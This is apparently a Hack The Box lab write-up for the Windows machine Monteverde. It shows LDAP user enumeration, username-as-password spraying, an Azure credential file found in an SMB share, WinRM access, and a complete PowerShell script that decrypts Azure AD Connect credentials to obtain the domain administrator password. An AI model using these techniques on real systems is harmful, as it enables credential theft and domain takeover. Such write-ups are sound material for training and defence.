

### Initial access
Port scan
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-22 15:16:03Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49750/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59714/tcp): CLEAN (Timeout)
|   Check 2 (port 7507/tcp): CLEAN (Timeout)
|   Check 3 (port 29693/udp): CLEAN (Timeout)
|   Check 4 (port 59453/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-09-22T15:16:58
|_  start_date: N/A
|_clock-skew: -1m30s

```
subdomain scan
dirscan
filescan

Getusername
``` {8}
┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ nxc ldap 10.129.228.111 -u '' -p '' --users     
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\: 
LDAP        10.129.228.111  389    MONTEVERDE       [*] Enumerated 10 domain users: MEGABANK.LOCAL
LDAP        10.129.228.111  389    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.228.111  389    MONTEVERDE       Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.228.111  389    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 17:53:24 0        Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
LDAP        10.129.228.111  389    MONTEVERDE       mhope                         2020-01-02 18:40:05 0                                                                    
LDAP        10.129.228.111  389    MONTEVERDE       SABatchJobs                   2020-01-03 07:48:46 0                                                                    
LDAP        10.129.228.111  389    MONTEVERDE       svc-ata                       2020-01-03 07:58:31 0                                                                    
LDAP        10.129.228.111  389    MONTEVERDE       svc-bexec                     2020-01-03 07:59:55 0                                                                    
LDAP        10.129.228.111  389    MONTEVERDE       svc-netapp                    2020-01-03 08:01:42 0                                                                    
LDAP        10.129.228.111  389    MONTEVERDE       dgalanos                      2020-01-03 08:06:10 0                                                                    
LDAP        10.129.228.111  389    MONTEVERDE       roleary                       2020-01-03 08:08:05 0                                                                    
LDAP        10.129.228.111  389    MONTEVERDE       smorgan                       2020-01-03 08:09:21 0                                                                    
┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ nxc ldap 10.129.228.111 -u '' -p '' --users | awk 'NR>4 {print $5}' | grep -v -E '^[[:space:]]*$' | grep -v 'Guest' > users.txt

```
Spraypass using username
```bash  {24}
┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ nxc ldap 10.129.228.111 -u users.txt -p users.txt 
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:AAD_987d7f2f57d2 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:mhope 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs 
LDAP        10.129.228.111  389    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs 
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 


SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ            

```
Using smblcient ot rad smb share folder
```
┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ impacket-smbclient 'SABatchJobs:SABatchJobs'@10.129.228.111           
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
azure_uploads
C$
E$
IPC$
NETLOGON
SYSVOL
users$
# use users$
# ls
drw-rw-rw-          0  Fri Jan  3 08:12:48 2020 .
drw-rw-rw-          0  Fri Jan  3 08:12:48 2020 ..
drw-rw-rw-          0  Fri Jan  3 08:15:23 2020 dgalanos
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 mhope
drw-rw-rw-          0  Fri Jan  3 08:14:56 2020 roleary
drw-rw-rw-          0  Fri Jan  3 08:14:28 2020 smorgan

# cd mhope
# ls
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 .
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 ..
-rw-rw-rw-       1212  Fri Jan  3 09:59:24 2020 azure.xml
# mget *

┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ cat azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs> 
```
We have Azure pass, spray password
```bash {5}
┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ nxc smb 10.129.228.111 -u users.txt -p '4n0therD4y@n0th3r$'     
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
```
Evil winrm
```
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ nxc winrm 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'                                                                                                 
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.228.111  5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'                    
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> 


```
### Lateral Movement
### Priv escalation

Check group user
```
*Evil-WinRM* PS C:\Users\mhope> net user mhope /domain
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   9/22/2026 8:55:14 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.

```

We using this to exploit  https://github.com/glowbase/Get-MSOLCredentials.ps1/blob/main/Get-MSOLCredentials.ps1
```powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost;Database=ADSync;Integrated Security=sspi"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

```powershell
Evil-WinRM* PS C:\Users\mhope\Documents> upload exp.ps1
                                        
Info: Uploading /home/kali/HTB/Monteverde/exp.ps1 to C:\Users\mhope\Documents\exp.ps1
                                        
Data: 2236 bytes of 2236 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\mhope\Documents> ./exp.ps1
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!


```
Get system shell
```powershell
┌──(kali㉿kali)-[~/HTB/Monteverde]
└─$ evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

| Username          | pass               | Hash |
| ----------------- | ------------------ | ---- |
| SABatchJobs       | SABatchJobs        |      |
| mhope             | 4n0therD4y@n0th3r$ |      |
| administrator<br> | d0m@in4dminyeah!   |      |
